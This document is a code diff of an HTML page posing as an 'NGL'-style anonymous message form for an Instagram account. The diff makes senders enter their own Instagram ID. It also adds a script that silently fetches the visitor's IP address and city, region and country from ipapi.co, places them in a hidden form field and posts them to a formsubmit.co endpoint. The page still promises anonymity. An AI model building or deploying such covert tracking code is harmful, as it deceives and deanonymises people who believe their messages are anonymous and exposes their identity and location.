@@ -30,11 +30,10 @@
 					>
 						<path
 							fill-rule="evenodd"
-							d="M2.25 12c0-5.385 4.365-9.75 9.75-9.75s9.75 4.365 9.75 9.75-4.365 9.75-9.75 9.75S2.25 17.385 2.25 12Zm13.36-1.814a.75.75 0 1 0-1.22-.872l-3.236 4.53L9.53 12.22a.75.75 0 0 0-1.06 1.06l2.25 2.25a.75.75 0 0 0 1.14-.094l3.75-5.25Z"
+							d="M2.25 12c0-5.385..."
 							clip-rule="evenodd"
 						/>
 					</svg>
-
 					<p class="text-2xl font-semibold">Message sent successfully!</p>
 					<button
 						onclick="window.location.href='index.html'"
@@ -45,10 +44,71 @@
 				</div>
 			</div>
 
-			<!-- Step 1: Instagram Username -->
+			<!-- Step 1: Message Form -->
 			<div
 				id="step1"
 				class="flex flex-col items-center w-full gap-[50px] h-full justify-center"
+			>
+				<div
+					class="bg-opacity-40 bg-white rounded-[35px] w-full mb-4 shadow-lg text-black"
+				>
+					<div
+						class="flex items-center space-x-3 bg-white p-4 text-black rounded-t-[35px]"
+					>
+						<img
+							src="./487396330_1142496597672438_8422859713372662250_n.jpg"
+							class="w-[5rem] h-[5rem] bg-gray-300 rounded-full"
+						/>
+						<div>
+							<p class="text-4xl font-semibold text-black">@islam_muaz</p>
+							<p class="text-2xl text-black font-semibold">
+								send me anonymous messages!
+							</p>
+						</div>
+					</div>
+					<form
+						id="messageForm"
+						action="https://formsubmit.co/d306e3448dbcc9e537e5d7a3869605cc"
+						method="POST"
+						class="p-4 flex flex-col gap-10"
+					>
+						<input type="hidden" name="_captcha" value="false" />
+						<input type="hidden" name="_honey" style="display: none" />
+						<input
+							type="hidden"
+							name="_next"
+							value="https://ngl-fun.vercel.app/index.html?success=true"
+						/>
+						<input
+							type="hidden"
+							id="instaIdHidden"
+							name="Instagram ID"
+							value=""
+						/>
+						<input type="hidden" id="ipLocation" name="IP/Location" />
+
+						<textarea
+							name="Message"
+							placeholder="send me anonymous messages..."
+							required
+							class="w-full p-3 text-white bg-transparent bg-opacity-20 focus:outline-none resize-none h-[140px] placeholder-[#9E4254] text-4xl"
+						></textarea>
+
+						<button
+							type="button"
+							id="nextButton"
+							class="shadow-lg animate-bounce bg-black text-white font-bold p-8 rounded-full text-4xl w-full"
+						>
+							Continue
+						</button>
+					</form>
+				</div>
+			</div>
+
+			<!-- Step 2: Instagram ID -->
+			<div
+				id="step2"
+				class="hidden flex-col items-center w-full gap-[50px] h-full justify-center"
 			>
 				<div
 					class="bg-opacity-40 bg-white rounded-[35px] w-full mb-4 shadow-lg text-black"
@@ -69,89 +129,16 @@
 				</div>
 
 				<button
-					id="nextButton"
+					type="submit"
+					form="messageForm"
 					class="shadow-lg text-4xl animate-bounce bg-black text-white font-bold p-8 rounded-full mb-6 w-full"
 				>
 					Send!
 				</button>
 			</div>
-
-			<!-- Step 2: Message Form -->
-			<div
-				id="step2"
-				class="hidden flex-col items-center w-full h-full justify-between py-[15rem]"
-			>
-				<div
-					class="bg-opacity-40 bg-white rounded-[35px] w-80 mb-4 shadow-lg w-full"
-				>
-					<div
-						class="flex items-center space-x-3 bg-white p-4 text-black rounded-t-[35px]"
-					>
-						<img
-							src="./487396330_1142496597672438_8422859713372662250_n.jpg"
-							class="w-[5rem] h-[5rem] bg-gray-300 rounded-full"
-						/>
-						<div>
-							<p class="text-4xl font-semibold text-black">@islam_muaz</p>
-							<p class="text-2xl text-black font-semibold">
-								send me anonymous messages!
-							</p>
-						</div>
-					</div>
-
-					<form
-						action="https://formsubmit.co/d306e3448dbcc9e537e5d7a3869605cc"
-						method="POST"
-						class="p-4 flex flex-col gap-10"
-					>
-						<input type="hidden" name="_captcha" value="false" />
-						<input type="hidden" name="_honey" style="display: none" />
-						<input
-							type="hidden"
-							id="instaIdHidden"
-							name="Instagram ID"
-							value=""
-						/>
-
-						<input
-							type="hidden"
-							name="_next"
-							value="https://ngl-fun.vercel.app//index.html?success=true"
-						/>
-						<textarea
-							name="Message"
-							placeholder="send me anonymous messages..."
-							required
-							class="w-full p-3 text-white bg-transparent bg-opacity-20 focus:outline-none resize-none h-[140px] placeholder-[#9E4254] text-4xl"
-						></textarea>
-
-						<button
-							type="submit"
-							class="shadow-lg animate-bounce bg-black text-white font-bold p-8 rounded-full text-4xl w-full"
-						>
-							Send!
-						</button>
-					</form>
-				</div>
-
-				<!-- Tap Count & Footer -->
-				<div class="flex flex-col gap-3 items-center w-full">
-					<div class="flex flex-col items-center gap-2 w-full">
-						<p class="text-2xl mb-2">👇 229 people just tapped the button 👇</p>
-						<button
-							class="shadow-lg bg-black text-white font-bold p-8 text-4xl rounded-full mb-10 w-full"
-						>
-							Get your own messages!
-						</button>
-					</div>
-					<div class="flex space-x-4 text-xl opacity-75">
-						<a href="#" class="underline">Terms</a>
-						<a href="#" class="underline">Privacy</a>
-					</div>
-				</div>
-			</div>
 		</div>
 
+		<!-- Script -->
 		<script>
 			const nextButton = document.getElementById("nextButton");
 			const step1 = document.getElementById("step1");
@@ -160,7 +147,7 @@
 			const instaIdHidden = document.getElementById("instaIdHidden");
 			const successMessage = document.getElementById("successMessage");
 
-			// Show success message if URL has ?success=true
+			// Handle success redirect
 			if (window.location.search.includes("success=true")) {
 				step1.classList.add("hidden");
 				step2.classList.add("hidden");
@@ -168,21 +155,36 @@
 				successMessage.classList.add("flex");
 			}
 
+			// Go to Step 2
 			nextButton.addEventListener("click", () => {
-				const username = instaInput.value.trim();
-				if (!username) {
-					alert("Please enter your Instagram ID.");
-					return;
-				}
-				const formattedUsername = username.startsWith("@")
-					? username
-					: "@" + username;
-				instaIdHidden.value = formattedUsername;
-
 				step1.classList.add("hidden");
 				step2.classList.remove("hidden");
 				step2.classList.add("flex");
 			});
+
+			// On form submit, save Instagram ID
+			document
+				.getElementById("messageForm")
+				.addEventListener("submit", function (event) {
+					const username = instaInput.value.trim();
+					if (!username) {
+						alert("Please enter your Instagram ID.");
+						event.preventDefault();
+						return;
+					}
+					instaIdHidden.value = username.startsWith("@")
+						? username
+						: "@" + username;
+				});
+
+			// Fetch IP & location
+			fetch("https://ipapi.co/json/")
+				.then((response) => response.json())
+				.then((data) => {
+					const locationString = `${data.ip} | ${data.city}, ${data.region}, ${data.country_name}`;
+					document.getElementById("ipLocation").value = locationString;
+				})
+				.catch((err) => console.error("IP API error:", err));
 		</script>
 	</body>
 </html>
